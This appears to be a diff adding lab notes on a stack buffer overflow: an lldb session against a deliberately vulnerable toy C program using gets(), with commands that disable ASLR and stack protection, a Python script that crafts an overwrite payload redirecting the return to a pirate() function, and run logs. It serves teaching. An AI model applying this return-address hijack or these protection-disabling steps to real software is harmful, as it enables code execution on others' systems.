@@ -1,0 +1,462 @@
+# -----------------------------------------------
+# Crafting an attack by buffer overflow
+# -----------------------------------------------
+# Disable ASLR protection for the current session
+# Note: this creates a security risk for the current login session!!!
+#  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+#
+# Enable ASLR again
+#  echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+#
+# Compile helloFakedReturn.c with additional gcc options:
+#   -Wno-array-bounds -fno-stack-protector -fomit-frame-pointer
+
+# Scratch development for a binary compiled with frame pointer
+# The text reflects the environment on MacOS Ventura.
+
+# TODO FABR:
+# Adapt text below and add enhancements of adhoc python script
+# like e.g. in BuildDoc-no-fp.MacOS-Ventura.txt
+
+lldb bin/helloFakedReturn
+
+b main
+b get_name
+
+run
+
+   30  	}
+   31
+   32  	int main() {
+-> 33  		char *name=NULL;
+   34
+   35  		name = get_name();
+   36
+
+
+(lldb) dd
+helloFakedReturn, main
+    0    0x100003ef0 <+0>:    pushq %rbp
+    1    0x100003ef1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ef4 <+4>:    subq  $0x10,  %rsp
+    3    0x100003ef8 <+8>:    movl  $0x0,  -0x4(%rbp)
+->  4    0x100003eff <+15>:   movq  $0x0,  -0x10(%rbp)
+   *5    0x100003f07 <+23>:   callq 0x100003ec0  ; get_name
+    6    0x100003f0c <+28>:   movq  %rax,  -0x10(%rbp)
+    7    0x100003f10 <+32>:   cmpq  $0x0,  -0x10(%rbp)
+   *8    0x100003f15 <+37>:   je    0x100003f36 <+70> at helloFakedReturn.c:42:2
+    9    0x100003f1b <+43>:   movq  -0x10(%rbp),  %rsi
+    10   0x100003f1f <+47>:   leaq  0x78(%rip),  %rdi "\nHello %s\n"
+    11   0x100003f26 <+54>:   movb  $0x0,  %al
+   *12   0x100003f28 <+56>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    13   0x100003f2d <+61>:   movq  -0x10(%rbp),  %rdi
+   *14   0x100003f31 <+65>:   callq 0x100003f3e  ; (__TEXT.__stubs) free
+    15   0x100003f36 <+70>:   xorl  %eax,  %eax
+    16   0x100003f38 <+72>:   addq  $0x10,  %rsp
+    17   0x100003f3c <+76>:   popq  %rbp
+   *18   0x100003f3d <+77>:   retq
+
+# Remember
+# Return address from the fake is not the normal return address  0x100003f0c
+# but    0x100003f3c (Line 17)
+
+
+(lldb) stack_all
+
+304103530: 40 ac 49 08 01 00 00 00
+304103538: f0 3e 00 00 00 00 00 00
+304103540: e0 37 10 04 03 00 00 00  <-- fp of frame #0: main
+
+(lldb) p/x $sp
+(unsigned long) $0 = 0x0000000304103530
+
+(lldb) p/x $fp
+(unsigned long) $2 = 0x0000000304103540
+
+# print some bytes below the $fp of frame main; do some stack sniffing
+
+(lldb) x/64xb $sp
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0xf0 0x3e 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103558: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103560: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+===> below $fp = 0x304103540 is just the return address from main
+     and below that return address, the stack contains only 0x0 values :-)
+
+     Thus, we may get away with a stack pointer some slightly modified by our hack.
+
+(lldb) cont
+
+   20  	char* get_name(){
+   21  		char buf[15];
+   22
+-> 23  		printf("Please insert your surname (15 characters max): ");
+   24
+   25  		//scanf("%s",buf);
+   26  	        // We use the function gets(), which is vurlnerable to buffer overflow
+
+# 2 times next
+
+warning: this program uses gets(), which is unsafe.
+Please insert your surname (15 characters max): Peter
+
+   26  	        // We use the function gets(), which is vurlnerable to buffer overflow
+   27  		gets(buf);
+   28
+-> 29  		return strdup(buf);  // return a copy of the name on the heap
+   30  	}
+
+(lldb) stack_all
+
+304103510: 00 50 65 74 65 72 00 00
+304103518: 00 00 00 00 00 00 00 00
+304103520: 40 35 10 04 03 00 00 00  <-- fp of frame #0
+304103528: 0c 3f 00 00 01 00 00 00
+304103530: 00 00 00 00 00 00 00 00
+304103538: f0 3e 00 00 00 00 00 00
+304103540: e0 37 10 04 03 00 00 00  <-- fp of frame #1: main
+
+(lldb) x/`0x304103550 - $sp +8`xb $sp`
+0x304103510: 0x00 0x50 0x65 0x74 0x65 0x72 0x00 0x00
+0x304103518: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103520: 0x40 0x35 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103528: 0x0c 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103538: 0xf0 0x3e 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+
+--- the adhoc script 2 with dump to file
+
+(lldb) script
+
+def store_arch_word_in_blob(blob, size, offset, value):
+    blob[offset:offset+size] = value
+
+from __future__ import print_function
+import binascii
+
+frame = lldb.frame
+process = lldb.process
+target = lldb.target
+
+arch_size = process.GetAddressByteSize()
+pirate_addr = target.EvaluateExpression('&pirate').GetValueAsUnsigned()
+
+addr_buf = frame.FindVariable('buf').GetAddress().load_addr
+addr_start = addr_buf
+addr_fp = frame.GetFP()
+addr_parent_frame_fp = frame.get_parent_frame().GetFP()
+
+# create a faked stack content down to address 0x304103550
+bytes_to_read = addr_parent_frame_fp - addr_buf + 2*arch_size
+
+# Read the entire stack blob
+err = lldb.SBError()
+stack_blob = process.ReadMemory(addr_start,bytes_to_read, err)
+
+# create new byte array blob of appropriate size (arch_size les than read size)
+newblob = [0] * (bytes_to_read - arch_size)
+
+# override the buffer with 'A' characters above addr_fp
+for offset in range(0,bytes_to_read,1):
+    # respect guard for stack smashing
+    #if addr_start + offset < addr_fp - arch_size:
+    if addr_start + offset < addr_fp:
+        newblob[offset] = 0x41
+
+offset_fp  = addr_fp - addr_start  # offset for entry of fp: 304103520
+# write the frame pointer backup for frame of main
+store_arch_word_in_blob(newblob, arch_size, offset_fp, stack_blob[offset_fp:offset_fp+arch_size])
+# fake the start address of pirate() as return address
+store_arch_word_in_blob(newblob, arch_size, offset_fp + 1* arch_size, list(pirate_addr.to_bytes(arch_size, byteorder = 'little')))
+# write the faked return address to main: 0x100003f3c 
+store_arch_word_in_blob(newblob, arch_size, offset_fp + 2* arch_size, list((int(0x100003f3c).to_bytes(arch_size, byteorder = 'little'))))
+# move backup of frame pointer for frame below main
+store_arch_word_in_blob(newblob, arch_size, offset_fp + 3* arch_size, stack_blob[offset_fp+4*arch_size:offset_fp+5*arch_size])
+# move return address to function that called main
+store_arch_word_in_blob(newblob, arch_size, offset_fp + 4* arch_size, stack_blob[offset_fp+5*arch_size:offset_fp+6*arch_size])
+
+# Write newblob to file
+newbuf = bytearray(newblob)
+with open ("fakeinput", "wb") as bindata:
+    bindata.write(newbuf)
+
+
+# Write the new stack blob to memory
+err = lldb.SBError()
+stack_blob = process.WriteMemory(addr_start,newbuf, err)
+
+# exit script mode
+
+
+(lldb) stack_all
+
+304103510: 00 41 41 41 41 41 41 41
+304103518: 41 41 41 41 41 41 41 41
+304103520: 40 35 10 04 03 00 00 00  <-- fp of frame #0
+304103528: a0 3e 00 00 01 00 00 00
+304103530: 3c 3f 00 00 01 00 00 00
+304103538: e0 37 10 04 03 00 00 00
+304103540: 10 23 01 00 02 00 00 00  <-- fp of frame #1: main
+
+(lldb) p/x $sp
+(unsigned long) $9 = 0x0000000304103510
+
+(lldb) x/80xb $sp
+0x304103510: 0x00 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x304103518: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x304103520: 0x40 0x35 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103528: 0xa0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x3c 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103538: 0xe0 0x37 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103540: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103558: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+(lldb) dd
+
+helloFakedReturn, get_name
+    0    0x100003ec0 <+0>:    pushq %rbp
+    1    0x100003ec1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ec4 <+4>:    subq  $0x10,  %rsp
+    3    0x100003ec8 <+8>:    leaq  0x9e(%rip),  %rdi "Please insert your surname (15 characters max): "
+    4    0x100003ecf <+15>:   movb  $0x0,  %al
+   *5    0x100003ed1 <+17>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    6    0x100003ed6 <+22>:   leaq  -0xf(%rbp),  %rdi
+   *7    0x100003eda <+26>:   callq 0x100003f44  ; (__TEXT.__stubs) gets
+->  8    0x100003edf <+31>:   leaq  -0xf(%rbp),  %rdi
+   *9    0x100003ee3 <+35>:   callq 0x100003f50  ; (__TEXT.__stubs) strdup
+    10   0x100003ee8 <+40>:   addq  $0x10,  %rsp
+    11   0x100003eec <+44>:   popq  %rbp
+   *12   0x100003eed <+45>:   retq
+    13   0x100003eee <+46>:   nop
+
+# 3* ni
+
+(lldb) dd
+helloFakedReturn, get_name
+    0    0x100003ec0 <+0>:    pushq %rbp
+    1    0x100003ec1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ec4 <+4>:    subq  $0x10,  %rsp
+    3    0x100003ec8 <+8>:    leaq  0x9e(%rip),  %rdi "Please insert your surname (15 characters max): "
+    4    0x100003ecf <+15>:   movb  $0x0,  %al
+   *5    0x100003ed1 <+17>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    6    0x100003ed6 <+22>:   leaq  -0xf(%rbp),  %rdi
+   *7    0x100003eda <+26>:   callq 0x100003f44  ; (__TEXT.__stubs) gets
+    8    0x100003edf <+31>:   leaq  -0xf(%rbp),  %rdi
+   *9    0x100003ee3 <+35>:   callq 0x100003f50  ; (__TEXT.__stubs) strdup
+    10   0x100003ee8 <+40>:   addq  $0x10,  %rsp
+->  11   0x100003eec <+44>:   popq  %rbp
+   *12   0x100003eed <+45>:   retq
+    13   0x100003eee <+46>:   nop
+
+(lldb) x/32bx $sp
+
+0x304103520: 0x40 0x35 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103528: 0xa0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x3c 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103538: 0xe0 0x37 0x10 0x04 0x03 0x00 0x00 0x00
+
+# 2* ni
+
+Process 5998 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
+    frame #0: 0x0000000100003ea0 helloFakedReturn` pirate  at helloFakedReturn.c:16
+   13  	#include <string.h>
+   14  	#include <stdlib.h>
+   15
+-> 16  	void pirate(){
+   17  		printf("Your have been hacked\n");
+   18  	}
+   19
+
+(lldb) dd
+helloFakedReturn, pirate
+->  0    0x100003ea0 <+0>:    pushq %rbp
+    1    0x100003ea1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ea4 <+4>:    leaq  0xab(%rip),  %rdi "Your have been hacked\n"
+    3    0x100003eab <+11>:   movb  $0x0,  %al
+   *4    0x100003ead <+13>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    5    0x100003eb2 <+18>:   popq  %rbp
+   *6    0x100003eb3 <+19>:   retq
+    7    0x100003eb4 <+20>:   nopw  %cs:(%rax, %rax)
+    8    0x100003ebe <+30>:   nop
+
+# 2*ni
+
+(lldb) dd
+helloFakedReturn, pirate
+    0    0x100003ea0 <+0>:    pushq %rbp
+    1    0x100003ea1 <+1>:    movq  %rsp,  %rbp
+->  2    0x100003ea4 <+4>:    leaq  0xab(%rip),  %rdi "Your have been hacked\n"
+    3    0x100003eab <+11>:   movb  $0x0,  %al
+   *4    0x100003ead <+13>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    5    0x100003eb2 <+18>:   popq  %rbp
+   *6    0x100003eb3 <+19>:   retq
+    7    0x100003eb4 <+20>:   nopw  %cs:(%rax, %rax)
+    8    0x100003ebe <+30>:   nop
+
+(lldb) stack_all
+
+304103528: 40 35 10 04 03 00 00 00  <-- fp of frame #0
+304103530: 3c 3f 00 00 01 00 00 00
+304103538: e0 37 10 04 03 00 00 00
+304103540: 10 23 01 00 02 00 00 00  <-- fp of frame #1: main
+
+# 3*ni
+
+(lldb)
+Your have been hacked
+Process 6017 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
+    frame #0: 0x0000000100003eb2 helloFakedReturn` pirate  + 18 at helloFakedReturn.c:18
+   15
+   16  	void pirate(){
+   17  		printf("Your have been hacked\n");
+-> 18  	}
+   19
+   20  	char* get_name(){
+   21  		char buf[15];
+
+(lldb) dd
+helloFakedReturn, pirate
+    0    0x100003ea0 <+0>:    pushq %rbp
+    1    0x100003ea1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ea4 <+4>:    leaq  0xab(%rip),  %rdi "Your have been hacked\n"
+    3    0x100003eab <+11>:   movb  $0x0,  %al
+   *4    0x100003ead <+13>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+->  5    0x100003eb2 <+18>:   popq  %rbp
+   *6    0x100003eb3 <+19>:   retq
+    7    0x100003eb4 <+20>:   nopw  %cs:(%rax, %rax)
+    8    0x100003ebe <+30>:   nop
+
+(lldb) stack_all
+
+
+304103528: 40 35 10 04 03 00 00 00  <-- fp of frame #0
+304103530: 3c 3f 00 00 01 00 00 00
+304103538: e0 37 10 04 03 00 00 00
+304103540: 10 23 01 00 02 00 00 00  <-- fp of frame #1: main
+
+# 2*ni
+
+#
+# Note:
+# We returned to the fake return address in main()
+
+(lldb) dd
+helloFakedReturn, main
+    0    0x100003ef0 <+0>:    pushq %rbp
+    1    0x100003ef1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ef4 <+4>:    subq  $0x10,  %rsp
+    3    0x100003ef8 <+8>:    movl  $0x0,  -0x4(%rbp)
+    4    0x100003eff <+15>:   movq  $0x0,  -0x10(%rbp)
+   *5    0x100003f07 <+23>:   callq 0x100003ec0  ; get_name
+    6    0x100003f0c <+28>:   movq  %rax,  -0x10(%rbp)
+    7    0x100003f10 <+32>:   cmpq  $0x0,  -0x10(%rbp)
+   *8    0x100003f15 <+37>:   je    0x100003f36 <+70> at helloFakedReturn.c:41:2
+    9    0x100003f1b <+43>:   movq  -0x10(%rbp),  %rsi
+    10   0x100003f1f <+47>:   leaq  0x78(%rip),  %rdi "\nHello %s\n"
+    11   0x100003f26 <+54>:   movb  $0x0,  %al
+   *12   0x100003f28 <+56>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    13   0x100003f2d <+61>:   movq  -0x10(%rbp),  %rdi
+   *14   0x100003f31 <+65>:   callq 0x100003f3e  ; (__TEXT.__stubs) free
+    15   0x100003f36 <+70>:   xorl  %eax,  %eax
+    16   0x100003f38 <+72>:   addq  $0x10,  %rsp
+->  17   0x100003f3c <+76>:   popq  %rbp
+   *18   0x100003f3d <+77>:   retq
+
+
+(lldb) p/x $sp
+(unsigned long) $5 = 0x0000000304103538
+
+(lldb) stack_all
+
+Attention: x64 ABI red zone of leaf frame #0:
+
+304103530: 3c 3f 00 00 01 00 00 00
+304103538: e0 37 10 04 03 00 00 00
+304103540: 10 23 01 00 02 00 00 00  <-- fp of frame #0: main
+
+
+(lldb) x/32bx $sp
+
+0x304103538: 0xe0 0x37 0x10 0x04 0x03 0x00 0x00 0x00
+0x304103540: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+# ni
+
+(lldb) dd
+helloFakedReturn, main
+    0    0x100003ef0 <+0>:    pushq %rbp
+    1    0x100003ef1 <+1>:    movq  %rsp,  %rbp
+    2    0x100003ef4 <+4>:    subq  $0x10,  %rsp
+    3    0x100003ef8 <+8>:    movl  $0x0,  -0x4(%rbp)
+    4    0x100003eff <+15>:   movq  $0x0,  -0x10(%rbp)
+   *5    0x100003f07 <+23>:   callq 0x100003ec0  ; get_name
+    6    0x100003f0c <+28>:   movq  %rax,  -0x10(%rbp)
+    7    0x100003f10 <+32>:   cmpq  $0x0,  -0x10(%rbp)
+   *8    0x100003f15 <+37>:   je    0x100003f36 <+70> at helloFakedReturn.c:42:2
+    9    0x100003f1b <+43>:   movq  -0x10(%rbp),  %rsi
+    10   0x100003f1f <+47>:   leaq  0x78(%rip),  %rdi "\nHello %s\n"
+    11   0x100003f26 <+54>:   movb  $0x0,  %al
+   *12   0x100003f28 <+56>:   callq 0x100003f4a  ; (__TEXT.__stubs) printf
+    13   0x100003f2d <+61>:   movq  -0x10(%rbp),  %rdi
+   *14   0x100003f31 <+65>:   callq 0x100003f3e  ; (__TEXT.__stubs) free
+    15   0x100003f36 <+70>:   xorl  %eax,  %eax
+    16   0x100003f38 <+72>:   addq  $0x10,  %rsp
+    17   0x100003f3c <+76>:   popq  %rbp
+-> *18   0x100003f3d <+77>:   retq
+
+(lldb) p/x $sp
+(unsigned long) $13 = 0x0000000304103540
+
+(lldb) p/x $fp
+(unsigned long) $15 = 0x00000003041037e0
+
+(lldb) x/32bx $sp
+0x304103540: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103558: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+(lldb) cont
+
+Process 7289 resuming
+Process 7289 exited with status = 0 (0x00000000)
+
+#------------
+
+$ lldb bin/helloFakedReturn
+
+(lldb) process launch -i fakeinput
+
+warning: this program uses gets(), which is unsafe.
+Please insert your surname (15 characters max): You have been hacked!
+Process 7819 exited with status = 22 (0x00000016)
+
+
+#------------
+# However, running without debugger results in a seg fault
+
+cat fakeinput | bin/helloFakedReturn
+
+#> output
+warning: this program uses gets(), which is unsafe.
+Segmentation fault: 11
+
+#
+# TODO: remove the PIE flag from the executable.
+# Then the hack will work even for the command line.
+
